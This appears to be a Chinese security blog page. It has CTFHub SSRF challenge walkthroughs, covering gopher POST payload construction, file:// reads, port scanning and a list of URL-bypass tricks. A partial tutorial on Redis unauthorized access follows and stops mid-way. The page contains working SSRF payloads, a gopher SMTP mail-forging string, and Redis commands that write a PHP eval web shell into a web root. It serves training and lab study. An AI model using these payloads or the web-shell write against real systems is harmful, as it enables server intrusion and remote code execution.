<p>同时我们可以发现url参数是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-3838ac66a8862c7b.sandbox.ctfhub.com:10800/?url=</span><br></pre></td></tr></table></figure>

<p>所以在url参数后面直接输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<p>就得到了flag.</p>
<p><img src="/ctfhubssrf/CTFhubssrf%E7%9A%84%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png"></p>
<h2 id="ctfhub-ssrf的伪协议读取文件"><a href="#ctfhub-ssrf的伪协议读取文件" class="headerlink" title="ctfhub ssrf的伪协议读取文件"></a>ctfhub ssrf的伪协议读取文件</h2><p>老规矩，题目里有提示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">尝试去读取一下Web目录下的flag.php吧</span><br></pre></td></tr></table></figure>

<p>同时题目又告诉我们是用伪协议读取web目录下的文件：</p>
<p>而web目录下的文件一般放在&#x2F;var&#x2F;www&#x2F;html下：</p>
<p>所以我们就用最简单的file:&#x2F;&#x2F;协议进行读取，payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<p>页面显示？？？,直接f12查看源代码就得到了flag。</p>
<h2 id="ctfhub-ssrf的端口扫描"><a href="#ctfhub-ssrf的端口扫描" class="headerlink" title="ctfhub ssrf的端口扫描"></a>ctfhub ssrf的端口扫描</h2><p>题目提示让我们扫描8000到9000端口的，所以在这里就用burpsuite来爆破一下，在参数里随便写一个端口，转到burp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1:8727</span><br></pre></td></tr></table></figure>

<p><img src="/ctfhubssrf/ctfhubssrf%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F.png"></p>
<p><img src="/ctfhubssrf/ctfhubssrf%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png"></p>
<p>设置增量为1，范围是8000到9000，如果觉得爆破太慢，可以在选项里调线程数，根据长度找到我们要找的端口，在浏览器进行访问就得到了flag</p>
<p><img src="/ctfhubssrf/ctfhubssrf%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png"></p>
<h2 id="ctfhub-ssrf的POST请求"><a href="#ctfhub-ssrf的POST请求" class="headerlink" title="ctfhub ssrf的POST请求"></a>ctfhub ssrf的POST请求</h2><p>302跳转的302是状态码</p>
<p>表示请求的网页自请求的网页移动到了新的位置，搜索引擎索引中保存原来的URL</p>
<p>这里可以通过访问302.php，并且传参gopher来伪造本地访问</p>
<p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。随着HTTP协议的壮大，Gopher协议已经慢慢的淡出了我们的视线，但是Gopher协议很多组件都支持并且可以做很多事，在SSRF中，Gopher协议</p>
<p>可以对FTP、Telnet、Redis、Memcache、mysql进行攻击,也可以发送GET、POST 请求。</p>
<p>那么Gopher协议需要如何构造妮？</p>
<p>其实这个协议和http协议很类似，只不过gopher协议没有默认端口，需要特殊指定，而且需要指定POST方法，回车换行需要使用%0d%0a,而且POST参数之间的&amp;分隔符也需要URL编码</p>
<p>我们来看看Gopher协议的基本协议格式</p>
<p>gopher:&#x2F;&#x2F;:&#x2F;_后接TCP数据流</p>
<p>题目页面空白，尝试访问127.0.0.1&#x2F;flag.php</p>
<p><img src="/ctfhubssrf/ctfhubssrf%E7%9A%84POST%E8%AF%B7%E6%B1%82%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png"></p>
<p>有一个搜索框，f12查看源码发现：</p>
<p><img src="/ctfhubssrf/ctfhubssrf%E7%9A%84POST%E8%AF%B7%E6%B1%82%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png"></p>
<p>发现了key，将其中的值放到输入框，按下回车</p>
<p>显示只能从127.0.0.1访问，用file:&#x2F;&#x2F;伪协议访问一下index.php和flag.php，在f12里发现源码</p>
<p>index.php,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_REQUEST[&#x27;url&#x27;]))&#123;</span><br><span class="line">    header(&quot;Location: /?url=_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#x27;url&#x27;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);--&gt;</span><br></pre></td></tr></table></figure>

<p>flag.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag=getenv(&quot;CTFHUB&quot;);</span><br><span class="line">$key = md5($flag);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?--&gt;</span><br></pre></td></tr></table></figure>

<p>一个比较好的思路：目前已知flag.php含有奇怪字符key，index.php能够接受url传参，并利用curl功能访问url传参的内容。那么我们可以利用gopher协议往index.php中传入一个POST请求包。请求包里是flag.php的key。</p>
<p>我们需要构造：?url&#x3D;127.0.0.1:80&#x2F;index.php?url&#x3D;(利用gopher协议传入post请求)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Length: 36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">key=e297679320b3831c12537c0a981d5055</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：在使用 Gopher协议发送 POST请求包时，Host、Content-Type和Content-Length请求头是必不可少的，但在 GET请求中可以没有。</p>
<p>在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次 URL解码。</p>
<p>所以我们需要对构造的请求包进行两次 URL编码</p>
<p>在第一次编码后的数据中，将%0A全部手动替换为%0D%0A。因为 Gopher协议包含的请求数据包中，可能包含有&#x3D;、&amp;等特殊字符，避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把%后的字节当做普通字节。</p>
<p>可以直接使用脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">payload =\</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">key=e297679320b3831c12537c0a981d5055</span><br><span class="line">&quot;&quot;&quot;  </span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class="line">result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line">print(result)       # 因为是GET请求所以要进行两次url编码</span><br></pre></td></tr></table></figure>

<p>将跑出来的值在index.php下提交给url即可（因为index.php源码里说到可以url传参）</p>
<p><img src="/ctfhubssrf/ctfhubssrf%E7%9A%84POST%E8%AF%B7%E6%B1%82%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png"></p>
<h2 id="ctfhub-ssrf的上传文件"><a href="#ctfhub-ssrf的上传文件" class="headerlink" title="ctfhub ssrf的上传文件"></a>ctfhub ssrf的上传文件</h2><p>题目提示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这次需要上传一个文件到flag.php</span><br></pre></td></tr></table></figure>

<p>所以用file:&#x2F;&#x2F;伪协议访问flag.php</p>
<p>看一下题目源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&quot;file&quot;]) &amp;&amp; $_FILES[&quot;file&quot;][&quot;size&quot;] --&gt;</span><br></pre></td></tr></table></figure>

<p>提示我们只允许从内网访问，否则会被拦截，同时我们发现前端并没有提交按钮，所以需要在前端代码中添加以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/ctfhubssrf/ctfhubssrf%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png"></p>
<p>这样就搞定了</p>
<p>随便上传一个文件，得到如下图：</p>
<p><img src="/ctfhubssrf/ctfhubssrf%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png"></p>
<p>只允许从本地访问，抓包</p>
<p><img src="/ctfhubssrf/ctfhubssrf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们把host那里改成127.0.0.1:80</span><br><span class="line">，然后复制，然后就是老操作了，url编码一次，把%0A换成%0D%0A，然后再url编码两次：</span><br></pre></td></tr></table></figure>

<p>然后进行gopher协议的使用，就可以成功得到flag:</p>
<p><img src="/ctfhubssrf/ctfhubssrf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png"></p>
<h2 id="ctfhub-ssrf的URLbypass"><a href="#ctfhub-ssrf的URLbypass" class="headerlink" title="ctfhub ssrf的URLbypass"></a>ctfhub ssrf的URLbypass</h2><p>这里就烁一下关于ssrf的绕过方式</p>
<p>1.攻击本地</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:80</span><br><span class="line">http://localhost:22</span><br></pre></td></tr></table></figure>

<p>2.利用[::]</p>
<p>http:&#x2F;&#x2F;[::]:80&#x2F; &#x3D;&gt;<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></p>
<p>不加端口的话是http:&#x2F;&#x2F;[::]&#x2F;</p>
<p>3.利用@</p>
<p>这里就是在指定的网址后加@+127.0.0.1</p>
<p>4.利用短域名</p>
<p><a target="_blank" rel="noopener" href="http://dwz.cn/11SMa">http://dwz.cn/11SMa</a> &gt;&gt;&gt; <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></p>
<p>下面两个都是直接访问本地127.0.0.1&#x2F;flag.php</p>
<p><a target="_blank" rel="noopener" href="http://surl-2.cn/0nPI">http://surl-2.cn/0nPI</a></p>
<p><a target="_blank" rel="noopener" href="http://dwz-1.ink/0ndbh">http://dwz-1.ink/0ndbh</a></p>
<p>5.利用特殊域名</p>
<p>原理是DNS解析</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1.xip.io/">http://127.0.0.1.xip.io/</a></p>
<p><a target="_blank" rel="noopener" href="http://www.owasp.org.127.0.0.1.xip.io/">http://www.owasp.org.127.0.0.1.xip.io/</a></p>
<p>6.利用DNS解析</p>
<p>在域名上设置A记录，指向127.0.0.1</p>
<p>7.利用上传</p>
<p>修改”type&#x3D;file”为”type&#x3D;url”</p>
<p>比如：上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF</p>
<p>8.利用句号</p>
<p>127。0。0。1&#x3D;&gt;127.0.0.1</p>
<p>9.进行进制转换</p>
<p>可以是十六进制，八进制等。<br>115.239.210.26 &gt;&gt;&gt; 16373751032<br>首先把这四段数字给分别转成16进制，结果：73 ef d2 1a<br>然后把 73efd21a 这十六进制一起转换成8进制<br>记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</p>
<p>10.利用特殊地址</p>
<p><a target="_blank" rel="noopener" href="http://0.0.0.0/">http://0/</a></p>
<p>11.利用协议</p>
<p>Dict:&#x2F;&#x2F;</p>
<p>dict:&#x2F;&#x2F;@:&#x2F;d:</p>
<p>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;attacker:11111&#x2F;</p>
<p>SFTP:&#x2F;&#x2F;</p>
<p>ssrf.php?url&#x3D;s<a href="ftp://example.com:11111/">ftp://example.com:11111/</a></p>
<p>TFTP:&#x2F;&#x2F;</p>
<p>ssrf.php?url&#x3D;t<a href="ftp://example.com:12346/TESTUDPPACKET">ftp://example.com:12346/TESTUDPPACKET</a></p>
<p>LDAP:&#x2F;&#x2F;</p>
<p>ssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:11211&#x2F;%0astats%0aquit</p>
<p>Gopher:&#x2F;&#x2F;</p>
<p>ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25&#x2F;xHELO%20localhost%250d%250aMAIL%20FROM%3A%<a href="mailto:&#51;&#x43;&#x68;&#97;&#x63;&#x6b;&#x65;&#114;&#x40;&#x73;&#105;&#116;&#x65;&#46;&#99;&#x6f;&#x6d;">&#51;&#x43;&#x68;&#97;&#x63;&#x6b;&#x65;&#114;&#x40;&#x73;&#105;&#116;&#x65;&#46;&#99;&#x6f;&#x6d;</a>%3E%250d%250aRCPT%20TO%3A%<a href="mailto:&#51;&#67;&#x76;&#x69;&#99;&#116;&#x69;&#x6d;&#64;&#x73;&#x69;&#x74;&#101;&#x2e;&#x63;&#111;&#109;">&#51;&#67;&#x76;&#x69;&#99;&#116;&#x69;&#x6d;&#64;&#x73;&#x69;&#x74;&#101;&#x2e;&#x63;&#111;&#109;</a>%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%<a href="mailto:&#x33;&#x43;&#x68;&#97;&#99;&#x6b;&#x65;&#114;&#x40;&#115;&#105;&#x74;&#101;&#x2e;&#x63;&#x6f;&#x6d;">&#x33;&#x43;&#x68;&#97;&#99;&#x6b;&#x65;&#114;&#x40;&#115;&#105;&#x74;&#101;&#x2e;&#x63;&#x6f;&#x6d;</a>%3E%250d%250aTo%3A%20%<a href="mailto:&#51;&#67;&#x76;&#105;&#x63;&#116;&#x69;&#x6d;&#101;&#x40;&#x73;&#105;&#x74;&#x65;&#46;&#x63;&#111;&#x6d;">&#51;&#67;&#x76;&#105;&#x63;&#116;&#x69;&#x6d;&#101;&#x40;&#x73;&#105;&#x74;&#x65;&#46;&#x63;&#111;&#x6d;</a>%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>题目有一个提示说是：</p>
<p>请求的URL中必须包含<a target="_blank" rel="noopener" href="http://notfound.ctfhub.com,来尝试利用url的一些特殊地方绕过这个限制吧/">http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</a></p>
<p>直接构造payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<p>直接就得到了flag。</p>
<h2 id="ctfhub-ssrf的数字IP-Bypass"><a href="#ctfhub-ssrf的数字IP-Bypass" class="headerlink" title="ctfhub ssrf的数字IP Bypass"></a>ctfhub ssrf的数字IP Bypass</h2><p>题目给了hint</p>
<p>这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</p>
<p>告诉我们不能用十进制了</p>
<p>![](ctfhubssrf&#x2F;ctfhubssrf的数字IP bypasss接替截图.png)</p>
<p>因为不能用十进制，所以我们试一下十六进制可不可以，127.0.0.1转换为十六进制是0x7F000001,访问就拿到了flag。</p>
<h2 id="ctfhub-ssrf的302by-pass"><a href="#ctfhub-ssrf的302by-pass" class="headerlink" title="ctfhub ssrf的302by pass"></a>ctfhub ssrf的302by pass</h2><p>SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧</p>
<p>还是先试一下127.0.0.1&#x2F;flag.php，访问一下，返回如下：</p>
<p>![](ctfhubssrf&#x2F;ctfhubssrf的302 bypass解题截图.png)</p>
<p>接下来就是试一试URL bypass提到的绕过方式吗，发现直接替换成localhost就成功了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=localhost/flag.php</span><br></pre></td></tr></table></figure>

<h2 id="ctfhub-ssrf的DNS重绑定"><a href="#ctfhub-ssrf的DNS重绑定" class="headerlink" title="ctfhub ssrf的DNS重绑定"></a>ctfhub ssrf的DNS重绑定</h2><p>进来就先试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<p>使用题目所给链接。到DNS重绑定的一个工具里</p>
<p><img src="/ctfhubssrf/ctfhubssrf%E7%9A%84DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png"></p>
<p>将那个7f000001.7f000002.rbndr.us替换127.0.0.1构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=7f000001.7f000002.rbndr.us/flag.php</span><br></pre></td></tr></table></figure>

<p>成功了</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="liberator">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="liberator">
      <meta itemprop="description" content="君子坐而论道，少年起而行之">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | liberator">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/06/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83/" class="post-title-link" itemprop="url">redis未授权</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-06-09 17:26:27 / 修改时间：17:30:51" itemprop="dateCreated datePublished" datetime="2023-06-09T17:26:27+08:00">2023-06-09</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>6.1k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>11 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="redis未授权"><a href="#redis未授权" class="headerlink" title="redis未授权"></a>redis未授权</h1><h2 id="什么是redis"><a href="#什么是redis" class="headerlink" title="什么是redis"></a>什么是redis</h2><p>Redis是现在最受欢迎的NoSQL数据库之一，Redis是一个使用ANSI C编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库，其具备如下特性：</p>
<ul>
<li>基于内存运行，性能高效</li>
<li>支持分布式，理论上可以无限扩展</li>
<li>key-value存储系统</li>
<li>开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API</li>
</ul>
<p>相比于其他数据库类型，Redis具备的特点是：</p>
<ul>
<li>C&#x2F;S通讯模型</li>
<li>单进程单线程模型</li>
<li>丰富的数据类型</li>
<li>操作具有原子性</li>
<li>持久化</li>
<li>高并发读写</li>
<li>支持lua脚本</li>
</ul>
<p>简单来讲，redis其实就是一个非关系型数据库</p>
<h2 id="redis未授权漏洞原理"><a href="#redis未授权漏洞原理" class="headerlink" title="redis未授权漏洞原理"></a>redis未授权漏洞原理</h2><p>Redis默认情况下是绑定在0.0.0.0:6379端口的，如果没有设置密码（一般密码为空）或者密码为弱密码的情况下并且也没有进行有效保护措施，那么处于公网的redis服务就会被任意的用户未授权访问，读取数据，甚至利用redis自身的命令，进行写入文件操作，这样就会恶意攻击者利用redis未授权漏洞进行进一步攻击。写入文件操作就例如在日志文件里将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
<h2 id="redis漏洞复现"><a href="#redis漏洞复现" class="headerlink" title="redis漏洞复现"></a>redis漏洞复现</h2><p>这里用的一台windows和一台kali，一台作为攻击机，一台作为靶机</p>
<h3 id="kali安装redis"><a href="#kali安装redis" class="headerlink" title="kali安装redis"></a>kali安装redis</h3><p>执行如下步骤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一步 wget http://download.redis.io/releases/redis-2.8.17.tar.gz#下载redis</span><br><span class="line">第二步 tar xzf redis-2.8.17.tar.gz#解压安装包</span><br><span class="line">第三步 cd redis-2.8.17 #进入redis文件夹</span><br><span class="line">第四步 make #在redis-2.8.17文件夹下执行make</span><br><span class="line">第五步 cd src#进入redis-2.8.17文件夹下的src文件夹</span><br><span class="line">第六步 cp redis-server /usr/bin</span><br><span class="line">第七步 cp redis-cli /usr/bin #将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</span><br><span class="line">第八步 cp redis-conf /etc/ #返回目录redis-2.8.17，将redis.conf拷贝到/etc/目录下</span><br><span class="line">第九步 redis-server /etc/redis.conf #使用/etc/目录下的reids.conf文件中的配置启动redis服务</span><br></pre></td></tr></table></figure>

<p><img src="/redis/redis-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%BC%80%E5%90%AF%E6%9C%8D%E5%8A%A1.png"></p>
<p>如果在执行上诉步骤中遇到相关问题，可以直接把错误回应扔给chatgpt，chatgpt会给出相应解决方法</p>
<h3 id="windows安装redis"><a href="#windows安装redis" class="headerlink" title="windows安装redis"></a>windows安装redis</h3><p>1.<a target="_blank" rel="noopener" href="https://github.com/microsoftarchive/redis/releases">Releases · microsoftarchive&#x2F;redis (github.com)</a></p>
<p><img src="/redis/windows%E5%AE%89%E8%A3%85reedis.png"></p>
<p>安装好后解压到对应目录</p>
<p>2.双击安装目录下的”redis-server.exe”文件，并保持窗口开启（若关闭窗口则服务关闭）。</p>
<p><img src="/redis/windows%E5%BC%80%E5%90%AFredis%E6%9C%8D%E5%8A%A1.png"></p>
<p>3.待开启后，就可以实现监听了（一定要在该目录上方输入cmd才行，不要直接右键点击空白处进入终端）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli.exe -h 靶机IP</span><br></pre></td></tr></table></figure>

<p><img src="/redis/windows%E9%80%9A%E8%BF%87redis%E5%AE%9E%E7%8E%B0%E7%9B%91%E5%90%AC.png"></p>
<p>到这里的环境就安装完毕了</p>
<h3 id="利用redis写webshell"><a href="#利用redis写webshell" class="headerlink" title="利用redis写webshell"></a>利用redis写webshell</h3><h4 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</span><br><span class="line"></span><br><span class="line">2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（开启web服务器，就可以利用url使用蚁剑进行连接）</span><br></pre></td></tr></table></figure>

<h4 id="开始复现："><a href="#开始复现：" class="headerlink" title="开始复现："></a>开始复现：</h4><p>执行如下步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config get dir #查看redis数据库路径</span><br><span class="line">config set dbfilename 22.php #生成22.php文件</span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;#将一句话木马写入文件中</span><br><span class="line">#&quot;\r\n\r\n&quot;是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。</span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n\r\n&quot;#上传木马可以通过蚁剑连接</span><br><span class="line">save#保存</span><br></pre></td></tr></table></figure>

<p><img src="/redis/%E4%B8%8A%E4%BC%A0webshell.png"></p>
<p>中间有一步是修改路径。后来发现可以不要，接下来去靶机看看是否写入成功</p>
<p><img src="/redis/%E4%B8%8A%E4%BC%A0webshell%E5%9B%BE%E7%89%872.png"></p>
<p>可以看到已经写入成功了。到这里但是发现怎么都连接不上，所以就尝试着修改路径：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html</span><br></pre></td></tr></table></figure>

<p>接下来的操作和之前的一样，先进行phpinfo()的测试</p>
